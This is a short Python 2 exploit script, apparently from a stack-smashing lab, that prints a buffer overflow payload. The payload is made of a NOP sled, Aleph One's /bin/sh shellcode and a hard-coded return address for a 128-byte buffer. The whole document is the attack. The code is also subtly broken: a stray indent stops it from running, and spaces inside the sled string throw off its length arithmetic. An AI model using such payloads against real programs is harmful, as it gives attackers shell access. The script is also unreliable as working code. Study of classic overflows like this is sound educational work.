# Aleph One shellcode .
sc = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"

# Buffer address in correct endianness
BUF_ADDR = "\xac\xf5\xff\xbf"
LENGTH_BUFFER = 128
SIZE_EBP = 4
SIZE_EIP = 4
TOTAL_LENGTH_INPUT = LENGTH_BUFFER + SIZE_EBP + SIZE_EIP
 # Print nop slide + shellcode + address of buffer
 print ( TOTAL_LENGTH_INPUT - len(sc) - len(BUF_ADDR)) * ' \x90 ' + sc + BUF_ADDR
